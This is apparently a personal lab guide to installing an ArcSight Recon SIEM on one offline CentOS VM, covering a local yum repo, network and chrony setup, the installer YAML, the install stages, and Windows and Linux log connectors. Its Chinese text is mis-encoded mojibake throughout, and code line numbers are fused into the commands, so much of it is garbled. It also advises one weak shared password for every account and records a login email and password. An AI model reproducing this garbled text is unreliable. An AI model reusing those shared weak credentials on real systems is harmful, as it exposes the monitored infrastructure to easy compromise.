åœ¨åç»­æ­¥éª¤ä½¿ç”¨arcsight-installå‘½ä»¤çš„precheckå‚æ•°æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥è™šæ‹Ÿæœºçš„ä¸€äº›é…ç½®ï¼Œå¦‚æœé…ç½®ä¸å¯¹ï¼Œåˆ™ä¸é€šè¿‡ã€‚åœ¨æ–­ç½‘ç¯å¢ƒä¸­ï¼Œprecheckå¯¹yumé…ç½®æ£€æŸ¥è¿™ä¸€é¡¹æœ‰æ¦‚ç‡ä¸é€šè¿‡ï¼Œä¼šæç¤ºä½¿ç”¨yum clean allå’Œyum updateï¼Œä½†æ­¤æ—¶è™šæ‹Ÿæœºæ— æ³•ä¸Šç½‘ï¼Œæ— æ³•å®Œæˆyum clean allå’Œyum updateå‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡æ­å»ºæœ¬åœ°yumæºçš„æ–¹å¼æ¥è§£å†³ä¸é€šè¿‡çš„è¿™ä¸€é¡¹ã€‚ ä¸Šä¼ CentOS-7-x86_64-DVD-2009.isoæ–‡ä»¶åˆ°è™šæ‹Ÿæœºä¸­çš„/mnt/ç›®å½•ä¸‹ æŒ‚è½½ISOé•œåƒåˆ°/mnt/yumç›®å½•ä¸‹ 1mkdir yum 1mount -t iso9660 /mnt/CentOS-7-x86_64-DVD-2009.iso /mnt/yum/ å›æ˜¾ç±»ä¼¼å¦‚ä¸‹æ˜¯æŒ‚è½½æˆåŠŸï¼š 1mount: /dev/loop0 is write-protected, mounting read-only å¤‡ä»½æœ¬åœ°repoæ–‡ä»¶ 12mkdir /opt/centos-yum.bakmv /etc/yum.repos.d/* /opt/centos-yum.bak/ åˆ›å»ºè‡ªå·±çš„repoæ–‡ä»¶ 12cd /etc/yum.repos.d/vi /etc/yum.repos.d/local.repo æ–‡ä»¶local.repoå†…å®¹ä¸ºï¼š 123456[local]name=localbaseurl=file:///mnt/yum/ #æœ¬åœ°yumæºç›®å½•ä½ç½®# enabled=1 #enabled=0é…ç½®é¡¹ï¼Œè¡¨ç¤ºä¸ç”Ÿæ•ˆgpgcheck=1 gepkey=file:///mnt/yum/RPM-GPG-KEY-CentOS-7\t#æœ¬åœ°yumæºç›®å½•ä½ç½®ä¸‹GPGå…¬é’¥ åˆ·æ–°yumç¼“å­˜ æ¸…é™¤ç¼“å­˜ 1yum clean all æŠŠyumæºç¼“å­˜åˆ°æœ¬åœ° 1yum makecache ä¸»æœºåã€å…³é—­ipv6ã€è®¾ç½®é™æ€ipã€DNS ä¸»æœºå 1vim /etc/hostname å°†æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸ºï¼š 1cdf6.arcsight-test.com æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç”Ÿæ•ˆï¼š 1hostnamectl status å…³é—­ipv6åœ°å€ vim /etc/sysctl.conf æ–‡ä»¶ä¸­åŠ å…¥ä¸€è¡Œï¼š 1net.ipv6.conf.all.disable_ipv6 = 1 éšåæ‰§è¡Œ 1sysctl -p /etc/sysctl.conf æ£€éªŒï¼šifconfig æŸ¥çœ‹ipv6å·²å»æ‰ é™æ€IP 1vi /etc/sysconfig/network-scripts/ifcfg-ens33 ç½‘å¡å¯èƒ½ä¸åŒï¼Œåˆ™åé¢çš„ifcfg-xxxxå°±ä¸åŒ ä¿®æ”¹ä¸ºï¼š 12345678910111213141516171819TYPE=&quot;Ethernet&quot;PROXY_METHOD=&quot;none&quot;BROWSER_ONLY=&quot;no&quot;+BOOTPROTO=&quot;static&quot;DEFROUTE=&quot;yes&quot;IPV4_FAILURE_FATAL=&quot;no&quot;IPV6INIT=&quot;yes&quot;IPV6_AUTOCONF=&quot;yes&quot;IPV6_DEFROUTE=&quot;yes&quot;IPV6_FAILURE_FATAL=&quot;no&quot;IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;NAME=&quot;ens33&quot;UUID=&quot;15ea7cf0-782d-44b1-ad10-630abf731345&quot;DEVICE=&quot;ens33&quot;ONBOOT=&quot;yes&quot;+IPADDR=&quot;192.168.147.136&quot;+NETMASK=&quot;255.255.255.0&quot;+GATEWAY=&quot;192.168.147.2&quot;+DNS1=&quot;192.168.147.135&quot; éšåé‡å¯ç½‘å¡ï¼š 1service network restart æ£€éªŒï¼š ç¡®ä¿nslookup cdf6.arcsight-test.comè§£æå‡ºçš„æ˜¯è‡ªå·±çš„ipåœ°å€ ç¡®ä¿dig cdf6.arcsight-test.comè§£æå‡ºçš„æ˜¯è‡ªå·±çš„ipåœ°å€ï¼ŒDNSæœåŠ¡å™¨æ˜¯è‡ªå·±è®¾ç½®çš„ chronyå®¢æˆ·ç«¯é…ç½® 1vi /etc/chrony.conf æ³¨é‡Šæ‰4ä¸ªå¤–éƒ¨æ—¶é’Ÿï¼Œæ·»åŠ 192.168.147.201ä½œä¸ºæ—¶é’Ÿ 123456789101112131415161718192021222324252627282930313233343536373839# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackin å¦‚æœè™šæ‹Ÿæœºèƒ½è”ç½‘ï¼Œå¯é…ç½®å…¬ç½‘ä¸Šçš„æ—¶é’Ÿã€‚ é‡å¯chrony 1systemctl restart chronyd.service ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹åŒæ­¥çŠ¶æ€ï¼Œå…¶ä¸­â€œ^*â€ ä»£è¡¨æ—¶é—´å·²ç»æ­£ç¡®åŒæ­¥ 1chronyc sources -v åˆšé…ç½®å®Œé‡å¯åï¼Œæœ‰æ—¶chronyc sources -vçœ‹åŒæ­¥çŠ¶æ€ï¼Œæ²¡é‚£ä¹ˆå¿«å˜*å·ã€‚å¯ä»¥ç­‰ä¸€ä¼šï¼Œå¦‚æœè¿‡äº†æ¯”è¾ƒé•¿æ—¶é—´ç”¨chronyc sources -vè¿˜æ˜¯æ²¡çœ‹åˆ°æ˜Ÿå·ï¼Œå¯ä»¥å›é€€å¿«ç…§é‡æ¥ã€‚ ç›¸å…³å®‰è£…æ–‡ä»¶å‡†å¤‡ï¼ˆ6ä¸ªï¼‰ å°†ä»¥ä¸‹6ä¸ªæ–‡ä»¶æ”¾å…¥/opt/arcsightæ–‡ä»¶å¤¹ä¸­ï¼š å¼€å§‹å®‰è£… åœ¨/opt/arcsightä¸‹è§£å‹ 1[root@cdf6 arcsight ]# unzip arcsight-platform-installer-21.1.0.9.zip æ”¾ç›¸å…³æ–‡ä»¶ 12[root@cdf6 arcsight ]# mv arcsight-installer-metadata-21.1.0.9.tar arcsight-platform-installer-21.1.0.9/metadata/[root@cdf6 arcsight ]# mv *.tar arcsight-platform-installer-21.1.0.9/images/ ä¿®æ”¹yamlæ–‡ä»¶ä¸­æ‰€æœ‰hostnameå­—æ®µä¸ºæœ¬ä¸»æœºçš„åŸŸåcdf6.arcsight-test.comï¼Œå®Œæ•´å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# ArcSight Recon single node installation configuration## This example configures all components required by Recon to be installed on a single node including Fusion, Transformation Hub, and Database.## Before using this example, you must do the following:# - Replace the hostname &quot;yourdomain-node.yourenterprise.net&quot; (same value in multiple locations) with the correct values for your environment.# - Set the values of arcmc-generator-id-start and arcmc-generator-id-end to form a valid Generator ID Range# Generator ID Range: set a valid range within [1-16383]. # The difference between the values must be more than 100.## Key aspects of this configuration are:# - Encryption: yes# - Transformation Hub TLS Client Auth: yes# - FIPS 140 mode: yes# - High Availability: no, since it is deployed on a single node#cluster: default-node-size: small allow-worker-on-master: true enable-fips: false k8s-home: /opt/arcsight/kubernetes # master-api-ssl-port: 7443 master-nodes: - hostname: cdf6.arcsight-test.com username: root labels: [zk, kafka, th-processing, th-platform, fusion]suite: products: [transformationhub, fusion, recon] config-params: # Transformation Hub, defaults are commented th-init-fips: false # th-init-noOfTopicPartitions: 6 # The ArcSight Platform Installer automatically sets th-arcsight-avro, mf-event-avro-enriched, and th-cef topic partition count to Number of Database Nodes * 24. Other topics use this parameter. # th-init-kafkaRetentionBytesForVertica: When the database is colocated with the Kubernetes cluster, the ArcSight Platform Installer automatically calculates this value. # th-init-kafkaRetentionBytes: When the database is colocated with the Kubernetes cluster, the ArcSight Platform Installer automatically calculates this value. th-schema-registry-count: 1 transform-processor-replicas: 2 # enrichment-processor1-replicas: 2 # th-enrichment-processor-integrity-enabled: false routing-processor1-replicas: 0 th-kafka-count: 1 th-zookeeper-count: 1 th-init-kafkaOffsetsTopicReplicationFactor: 1 th-init-topicReplicationFactor: 1 th-kafka-allow-plaintext: true th-init-client-auth: false # th-schema-registry-min-kafka-count: 1 # Fusion # Generator ID parameters are mandatory parameters. # Ensure that you set arcmc-generator-id-enable to true. arcmc-generator-id-start: 1 arcmc-generator-id-end: 101 arcmc-generator-id-enable: truenfs: node: hostname: cdf6.arcsight-test.com username: root type: new root-folder: /opt/arcsight-nfs uid: 1999 gid: 1999database: db-installer-dir: /opt/arcsight-db-tools type: new ssl-enabled: false ssl-client-auth-enabled: false db-admin: dbadmin app-admin: appadmin search-user: search shard-count: 3 data-dir: /opt/vertica/data depot-dir: /opt/vertica/depot nodes: - hostname: cdf6.arcsight-test.com username: root hardware: cpu: 4 memory: 16 disk: 50 cd /opt/arcsight/arcsight-platform-installer-21.1.0.9 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd precheck Troubleshootingï¼š ä¸èƒ½è”ç½‘çš„è™šæ‹Ÿæœºï¼Œyum configurationé‚£ä¸€é¡¹æœ‰æ¦‚ç‡æŠ¥é”™ã€‚è§£å†³åŠæ³•ï¼šå®‰è£…æœ¬åœ°yumæº https://www.freebuf.com/sectool/271726.html 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd preinstall NFSé‚£é‡Œä¼šæœ‰5ä¸ªUnableï¼Œä¸ç”¨ç†ä¼š Troubleshootingï¼š precheckè¿™ä¸€æ­¥åœ¨ä¼šæ£€æŸ¥å¹¶å°è¯•è‡ªåŠ¨å®‰è£…ç¼ºå¤±çš„æ“ä½œç³»ç»ŸåŒ…ä¾èµ–é¡¹ï¼Œå¦‚æœè™šæ‹Ÿæœºä¸èƒ½ä¸Šç½‘ï¼Œä¼šå®‰è£…å¤±è´¥ã€‚ä½†è¿˜æ˜¯é»‘è‰²å­—ä½“ï¼Œä¸ä¼šé‚£ä¹ˆæ˜¾çœ¼ã€‚å¦‚æœç»§ç»­ä¸‹ä¸€æ­¥ï¼Œä¼šæŠ¥å…³äºä¾èµ–é¡¹çš„é”™ã€‚ è§£å†³åŠæ³•ï¼šè‡ªè¡Œæå‰æŠŠç›¸å…³çš„åŒ…yum installäº†ã€‚ï¼ˆã€Šas-admin-guide.pdfã€‹-P80ï¼‰ 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd install æ¥å—æ¡çº¦ï¼Œè¾“å…¥yï¼› ä¼šè®©è®¾ç½®ä¸€å †å…³äºæ•°æ®åº“çš„å¯†ç ã€cdfçš„å¯†ç ï¼Œå¯ä»¥ç»Ÿä¸€è®¾ä¸ºAdmin@123ï¼› éšåä¼šä»Step 1ä¸€ç›´è‡ªåŠ¨å®‰è£…åˆ°Stepå‡ ï¼Ÿè®°ä¸æ¸…äº† åœ¨æœ‰çš„Stepä¸­ä¼šé—®æ˜¯å¦æ¥å—æŸæŸlicenseï¼Œè¾“å…¥yï¼› åœ¨Step11ï¼ˆï¼Ÿï¼‰ä¸­ä¼šé—®æ˜¯å¦è·³è¿‡è¿™äº›warningsï¼Œè¾“å…¥yï¼› Troubleshootingï¼š ç»å¸¸ä¼šå¡åœ¨Step11è¿™ä¸€æ­¥ï¼Œå¦‚æœæ²¡è¯¢é—®æ˜¯å¦è·³è¿‡è¿™äº›warningsï¼Œåè€Œåœæ­¢äº†ã€‚çœ‹è¾“å‡ºï¼Œé™¤äº†warningsè¿˜æœ‰FAILEDé¡¹ï¼Œæ ¹æ®å®ƒçš„è¾“å‡ºçœ‹å“ªä¸€äº›FAILEDï¼Œç„¶åå›é€€åˆ°preinstallå®Œæˆçš„å¿«ç…§ï¼Œè§£å†³å®ŒFAILEDï¼Œå†é‡æ–°installã€‚ å› ä¸ºinstallåæ•°æ®åº“å·²ç»å®‰è£…äº†ï¼Œå¦‚æœæœ‰äº†FAILEDé¡¹ï¼Œè§£å†³å®Œé‡æ–°æ‰§è¡Œinstallï¼Œä¼šæç¤ºæ•°æ®åº“å·²å­˜åœ¨ï¼Œè¦å…ˆå¸è½½æ•°æ®åº“ã€‚è¿™æ ·æ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥ï¼Œå…ˆè®°ä½å“ªäº›é¡¹FAILEDäº†ï¼Œç„¶åå›é€€å¿«ç…§ï¼Œå¤„ç†å®Œï¼Œå†installã€‚ ç­‰å¾…å®‰è£…å®Œæˆï¼Œä¼°è®¡20min~2å°æ—¶å·¦å³ï¼Œçœ‹æœºå™¨æ€§èƒ½ã€‚å¦‚æœå¡ä½ä¸€ä¸ªåœ°æ–¹æ—¶é—´å¤ªé•¿ï¼Œå¯èƒ½æ˜¯å› ä¸ºæœºå™¨ä¸´æ—¶å¡æ­»ã€‚åšæ³•ä¸€ï¼šç­‰å¾…ï¼Œç­‰å¾…ï¼Œç­‰å¾…ã€‚åšæ³•äºŒï¼šå›åˆ°preinstallçš„æ­¥éª¤æ¥ç€èµ°ã€‚ è®¿é—®https://cdf6.arcsight-test.com:5443 -&gt;deployment -&gt;reconfigure -&gt; ä¿®æ”¹ä¸€å¤„3ä¸º1(brokerçš„æœ€å°è¿è¡Œæ•°é‡) è´¦å·ï¼šadmin å¯†ç ï¼šAdmin@123 è´¦å·å¯†ç æ˜¯åœ¨ä¹‹å‰çš„æ­¥éª¤æ‰§è¡Œ./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd installè¿™æ¡å‘½ä»¤æ—¶è®¾ç½®çš„cdfå¯†ç  ç­‰å¾…ä¸€ä¼šï¼Œä½¿ç”¨kubectl get pods -Aå‘½ä»¤ç¡®ä¿æ‰€æœ‰podså¤„äºCompletedæˆ–RunningçŠ¶æ€åè¿›è¡Œpostinstall 1kubectl get pods -A|grep -v &quot;Running&quot; 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd postinstall ArcishgtæœåŠ¡ç«¯å¿«ç…§æ‹æ‘„è¯´æ˜ ä»ä¸Šè¿°å®‰è£…Arcsightçš„æ€»ä½“æµç¨‹æ¥çœ‹ï¼Œæ­å»ºæ­¥éª¤ä¸ºï¼š æ­å»ºDNSæœåŠ¡å™¨ æ­å»ºchronyæœåŠ¡å™¨é…ç½®ï¼ˆoptï¼‰ Arcsight reconæœåŠ¡ç«¯æ­å»ºï¼š è”ç½‘è™šæœºï¼šä¸»æœºåã€å…³é—­ipv6ã€è®¾ç½®é™æ€ipã€DNSï¼›chronyå®¢æˆ·ç«¯é…ç½®ï¼›ç›¸å…³å®‰è£…æ–‡ä»¶å‡†å¤‡ï¼› æ–­ç½‘è™šæœºï¼šä¸»æœºåã€å…³é—­ipv6ã€è®¾ç½®é™æ€ipã€DNSï¼›chronyå®¢æˆ·ç«¯é…ç½®ï¼›ç›¸å…³å®‰è£…æ–‡ä»¶å‡†å¤‡ï¼› éšåæ‰§è¡Œ4æ¡å‘½ä»¤precheckã€preinstallã€installã€postinstall 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdprecheck 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdpreinstall 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd install 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdpostinstall percheckæ‰§è¡Œå®Œåæ˜¯å¯ä»¥æ‹å¿«ç…§ï¼Œç„¶åæœªæ¥æ¢å¤åˆ°è¯¥å¿«ç…§ï¼› preinstallæ‰§è¡Œå®Œåæ˜¯å¯ä»¥æ‹å¿«ç…§ï¼Œç„¶åæœªæ¥æ¢å¤åˆ°è¯¥å¿«ç…§ï¼› è€Œå¦‚æœå·²ç»æ‰§è¡Œäº†installï¼Œå› ä¸ºpodså·²æèµ·æ¥äº†ï¼Œæ­¤æ—¶æŒ‚èµ·æˆ–å…³æœºï¼Œå†æ¬¡æ‰“å¼€ç¯å¢ƒä¼šå´©ï¼Œåªèƒ½å¯¹å®¹å™¨è¿›è¡Œè°ƒè¯•ï¼Œæˆ–è€…é‡è£…ã€‚ æ­£ç¡®æ­¥éª¤ï¼š åªè¦podså·²ç»è¿è¡Œèµ·æ¥äº†ï¼Œå°±è¦åœ¨/opt/arcsight/kubernetes/binä¸‹ä½¿ç”¨kube-stop.shè„šæœ¬è¿›è¡Œæš‚åœï¼Œæš‚åœå®Œæˆåå¯ä»¥æ‹å¿«ç…§oræŒ‚èµ·è™šæ‹Ÿæœºã€‚ æŒ‚èµ·è™šæ‹Ÿæœºæ‹å¿«ç…§ï¼Œå†æ¢å¤ï¼Œä¹Ÿä¸è¡Œ 12cd /opt/arcsight/kubernetes/bin./kube-stop.sh ä¸Šè¿°shï¼Œä¼šè‡ªåŠ¨æš‚åœç›¸å…³podsï¼Ÿï¼ˆæˆ‘è¯´æ³•å¯èƒ½ä¸å‡†ç¡®ï¼Œå› ä¸ºæˆ‘ä¹Ÿä¸å¤ªæ‡‚ï¼‰ æ¢å¤å‘½ä»¤ 1./kube-start.sh éœ€ç­‰å¾…è‡³ä½¿ç”¨kubectl get pods -Aå‘½ä»¤ç¡®ä¿æ‰€æœ‰podså¤„äºCompletedæˆ–RunningçŠ¶æ€ï¼Œ å†æ‰§è¡Œ 1./kube-status.sh ç›´è‡³ç»“å°¾æ˜¾ç¤ºâ€œFull CDF is Runningâ€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º Windowså®¢æˆ·ç«¯æ­å»ºæŒ‡å— æ–‡ä»¶æ¸…å• æ–‡ä»¶å MD5 ArcSight-8.2.0.8451.0-TrialConnector-Win64.exe dde8f122de58583fdd96499f7d28e7e8 æ¼”ç¤ºä¾‹å­ä¸­çš„åŸŸåã€IPä¸æœåŠ¡ç«¯å®‰è£…ä¸­ä¸åŒï¼Œå› ä¸ºç¬”è®°æ˜¯åœ¨å¤šæ¬¡ç¯å¢ƒå®‰è£…ä¸­åšçš„ï¼› åœ¨å®é™…å®‰è£…è¿‡ç¨‹ä¸­è¦å¯¹åº”å¥½ ä»¥Win 10ä¸ºä¾‹ï¼Œè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š é…ç½®DNS ç¡®ä¿èƒ½è§£æåŸŸåcdf6.arcsight-test.com åŒå‡»å®‰è£…åŒ…å¼€å§‹å®‰è£… é»˜è®¤ç‚¹å‡»OKï¼›å®‰è£…è·¯å¾„å¯ä¿æŒé»˜è®¤æˆ–è‡ªé€‰ï¼›åœ¨æ¡Œé¢åˆ›å»ºå›¾æ ‡ è¾“å…¥æ•°å­—ï¼ˆ1~16383ï¼‰ä½œä¸ºå”¯ä¸€IDï¼Œå…¶ä»–æ ä¸ç”¨å¡« é€‰æ‹©å®‰è£…çš„é‡‡é›†å™¨ç±»å‹ï¼Œå¹¶å…è®¸é˜²ç«å¢™å…è®¸è¯¥åº”ç”¨çš„éƒ¨åˆ†åŠŸèƒ½ è¢«åŠ¨é‡‡é›†å™¨ä»¥å®‰è£…Syslog NG Daemonä¸ºä¾‹ï¼Œåœ¨æ­¤å¤„é€‰æ‹©Syslog NG Daemon å¼€æ”¾UDP1999ç«¯å£ç›‘å¬æ—¥å¿—ï¼ˆç«¯å£å’Œåè®®å¯æ›´æ”¹) é€‰æ‹©è¦æ”¶é›†çš„æ—¥å¿—ä¿¡æ¯ï¼Œé»˜è®¤å³å¯ å°†é‡‡é›†å™¨æ”¶é›†çš„æ•°æ®å‘é€åˆ°&quot;Transformation hub&quot; tipsï¼šå¦‚æœæ˜¯å¿«é€Ÿæ£€éªŒï¼Œå¯ä»¥é€‰æ‹©ä¸å‘é€åˆ°æœåŠ¡ç«¯ï¼Œé€‰æ‹©CSV Fileé€‰é¡¹ç”Ÿæˆcsvæ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°ï¼ŒæŒ‡å®šä¿å­˜çš„è·¯å¾„ ç›®çš„å‚æ•°å¡«å†™å¦‚ä¸‹å›¾æ‰€ç¤º å°†ArcsightæœåŠ¡å™¨ä¸‹çš„/opt/arcsight-db-tools/cert/issue_ca.crtï¼Œå’ŒArcsightå®¢æˆ·ç«¯/$å®‰è£…ç›®å½•$/ArcSightConnectors/current/jre/lib/security/cacertsï¼Œå¤åˆ¶åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼ˆè‡ªå·±åˆ›å»ºçš„)ï¼Œä½¿ç”¨keytoolå·¥å…·å°†è¯ä¹¦æ·»åŠ åˆ°å¯†é’¥åº“ä¸­ 1keytool -import -alias connector -keystore &quot;E:\\certstemp\\cacerts&quot; -file issue_ca.crt å¯†é’¥åº“å£ä»¤ä¸ºchangeit æ˜¯ å°†ä¿¡ä»»åçš„cacertsè¯ä¹¦æ›¿æ¢Arcsightå®¢æˆ·ç«¯çš„/$å®‰è£…ç›®å½•$/ArcSightConnectors/current/jre/lib/security/cacertsï¼Œå¹¶å°†è¯ä¹¦ç›®å½•è¾“å…¥åˆ°SSL/TLS Truststore File Pathä¸€æ  æ³¨æ„è¦ä½¿ç”¨\\ ç‚¹å‡»NextæŒ‰é’®ï¼Œå¦‚æœæ²¡æœ‰æç¤ºé”™è¯¯ï¼Œå³å‚æ•°æ­£ç¡® connector detailsï¼ŒNameéšä¾¿å¡«ä¸€ä¸ªå³å¯ï¼Œå…¶ä»–é€‰å¡« é€‰æ‹©ä»¥æœåŠ¡æˆ–è€…ç‹¬ç«‹ç¨‹åºçš„å½¢å¼è¿›è¡Œå®‰è£…ï¼Œè¿™é‡Œä»¥ç‹¬ç«‹çš„ç¨‹åºä¸ºä¾‹ è¿™ä¸€æ­¥é€‰æ‹©Exité€€å‡ºå³å¯ è‡³æ­¤ï¼Œå®¢æˆ·ç«¯å®‰è£…å®Œæˆã€‚ Linuxå®¢æˆ·ç«¯æ­å»ºæŒ‡å—ï¼ˆä¸æˆåŠŸï¼‰ ä»¥Ubuntu20.04ä¸ºä¾‹ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š é…ç½®DNS 12sudo apt install resolvconfsudo systemctl enable --now resolvconf.service sudo vi /etc/resolvconf/resolv.conf.d/head 12nameserver 192.168.147.135nameserver 192.168.147.2 sudo resolvconf -u æ£€éªŒï¼š ç¡®ä¿nslookup cdf6.arcsight-test.comèƒ½æ­£ç¡®è§£æå‡ºç›¸åº”ipåœ°å€ ç¡®ä¿dig cdf6.arcsight-test.comèƒ½è§£æç›¸åº”ipåœ°å€ï¼ŒDNSæœåŠ¡å™¨åœ°å€æ­£ç¡® ä»¥rootç”¨æˆ·å®‰è£… 1./ArcSight-8.3.0.8658.0-TrialConnector-Linux64.bin è½¬å‘å™¨ç±»å‹é€‰æ‹©ï¼šApache HTTP Server Access Multiple FolderFile å‰æï¼šå·²å®‰è£…apache2 sudo apt update sudo apt install apache2 sudo systemctl status apache2ç¡®ä¿Apacheæ­£åœ¨è¿è¡Œ åç»­å’ŒWindowså®‰è£…è½¬å‘å™¨ä¸€è‡´ Linuxå®¢æˆ·ç«¯æ­å»ºæŒ‡å—ï¼ˆæœ¬åœ°csvç‰ˆï¼‰ æŒ‘é€‰çš„ä»¥apacheä¸ºäº‹ä»¶ä½œä¸ºä¾‹å­ã€‚éœ€è¦æå‰å®‰è£…ï¼šapache2ã€curl sudo apt update sudo apt install apache2 sudo systemctl status apache2ç¡®ä¿Apacheæ­£åœ¨è¿è¡Œ ä»¥rootç”¨æˆ·å®‰è£… 1./ArcSight-8.3.0.8658.0-TrialConnector-Linux64.bin è½¬å‘å™¨ç±»å‹é€‰æ‹©ï¼šApache HTTP Server Access Multiple FolderFile é€‰æ‹©ä¸Šæ¬¡CSVæ–‡ä»¶ï¼Œé€‰æ‹©ä¿å­˜åœ¨æ¡Œé¢ å…¶ä½™ä¸‹ä¸€æ­¥ï¼Œå³å¯å®Œæˆå®‰è£… å®¢æˆ·ç«¯å¼€å¯åŠåå°æœç´¢ğŸ” windowå¹³å° åœ¨C:\\Program Files\\ArcsightSmartConnectors\\current\\binç›®å½•ä¸‹ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€cmdï¼Œæ‰§è¡Œå‘½ä»¤ 1arcsight.bat agents å¯åŠ¨ArcsightSmartConnectors Linuxå¹³å° åœ¨å®‰è£…ç›®å½•binç›®å½•ä¸‹ä»¥rootæ‰“å¼€shellï¼Œæ‰§è¡Œå‘½ä»¤ 1./arcsight agents Linuxçš„ç›‘æ§äº‹ä»¶Apache HTTP Server Access Multiple Folder Fileï¼Œä¸”æ²¡æœ‰å°†æ•°æ®è½¬åˆ°Transformation Hubï¼Œè€Œæ˜¯ç”Ÿæˆæ¡Œé¢çš„CSV Fileã€‚ ä½¿ç”¨curl 127.0.0.1è®¿é—®apacheç½‘é¡µï¼ŒArcsighté‡‡é›†å™¨ä¼šé‡‡é›†åˆ°æ­¤äº‹ä»¶ã€‚ ä½¿ç”¨chromeæµè§ˆå™¨è¾“å…¥ç½‘å€https://cdf6.arcsight-test.comï¼Œç™»å½•æœåŠ¡ç«¯ç®¡ç†é¡µé¢ ç¬¬ä¸€æ¬¡ç™»å½•ï¼Œè¿›å…¥æ³¨å†Œç•Œé¢ï¼Œå¯ä»¥å¡«è™šå‡çš„é‚®ç®±ï¼Œä½†åé¢æ²¡æ³•æ‰¾å›å¯†ç äº†ã€‚å¯ä»¥æ³¨å†Œå‰æ‹ä¸€ä¸ªå¿«ç…§ï¼Œç„¶åå»æ³¨å†Œï¼Œç„¶åå¿˜äº†å¯†ç å°±å›é€€å¿«ç…§é‡æ–°æ³¨å†Œä¸€ä¸ªã€‚ â€‹\tè®°å½•ä¸€ä¸‹æˆ‘ä¹‹å‰æ³¨å†Œçš„ï¼š â€‹\tè´¦å·ä¸ºï¼šhello0308@gmail.com â€‹\tå¯†ç ä¸ºï¼šAdmin@123 åœ¨&quot;SEARCH&quot;é¡µé¢å³å¯å¼€å§‹æœç´¢ç”±å®¢æˆ·ç«¯äº§ç”Ÿçš„æ—¥å¿—ä¿¡æ¯ æœç´¢è¯­æ³•ï¼šæŸ¥è¯¢æ‰€æœ‰äº‹ä»¶ 1* æ¥æºipä¸º192.168.147.134çš„äº‹ä»¶ï¼š 1Any. ip = 192.168.147.134 Win Eventæ—¥å¿—ï¼š Syslog NG Daemonæ—¥å¿—ï¼š æˆ‘é…ç½®çš„æ˜¯UDP1999ï¼Œä½¿ç”¨syslog Senderå¾€è¯¥ç«¯å£å‘Messageï¼Œå¯åœ¨serveråå°æœç´¢åˆ° æ³¨æ„äº‹é¡¹ å®¢æˆ·ç«¯äº§ç”Ÿè¡Œä¸ºåï¼ŒæœåŠ¡ç«¯ç®¡ç†é¡µé¢ç”±äºæ•°æ®åº“ä»THæŠ“å–æ—¥å¿—é¢‘ç‡çš„é—®é¢˜ï¼Œä¸ä¼šé©¬ä¸Šæœç´¢åˆ°ç›¸åº”æ—¥å¿—ã€‚ è§£å†³æ–¹æ³•ï¼šæ›´æ”¹æœç´¢æ¡ä»¶ï¼ˆå¦‚æœç´¢è¯­æ³•ã€æ—¶é—´ç­‰æ¡ä»¶ï¼‰ï¼Œå¤šæ¬¡è¿›è¡Œæœç´¢ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè‡³å°‘å»¶è¿Ÿ5minå³å¯æœç´¢åˆ°ã€‚å¦‚æœè¿˜æ˜¯æ²¡æœ‰ï¼Œå¯èƒ½æ˜¯æ•°æ®åº“çš„æ—¶é—´å’Œé‡‡é›†å®¢æˆ·ç«¯æ—¶é—´ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚ &quot;è®°å½•&quot;ä¸€äº›æ–¹ä¾¿ç­›é€‰æ—¥å¿—å­—æ®µï¼š Agent Address Agent type Destination Username Database Receipt Time Normalized Event Time External ID Name æ‹“å±• åœ¨çº¿htmlè¯´æ˜æ‰‹å†Œï¼š https://www.microfocus.com/documentation/arcsight/arcsight-platform-22.1/arcsight-admin-guide-22.1/#platform_intro/platform_about.htm?TocPath=Introducing%2520ArcSight%2520Platform%257C_____0 syslogåŒºåˆ« https://community.microfocus.com/cyberres/arcsight/f/arcsight-discussions/366594/syslog-daemon-and-syslog-ng https://serverfault.com/questions/692309/what-is-the-difference-between-syslog-rsyslog-and-syslog-ng ç›¸å…³èµ„æº arcsightå®˜ç½‘https://www.microfocus.com/en-us/cyberres/secops/arcsight-esm å‚è€ƒæ–‡æ¡£ ArcSight Recon 1.2 Documentation Administratorâ€™s Guide to ArcSight Platform 21.1 ç¤¾åŒºè®ºå›https://community.microfocus.com/cyberres/?_ga=2.33871585.1994462426.1684978627-1507916439.1684978627 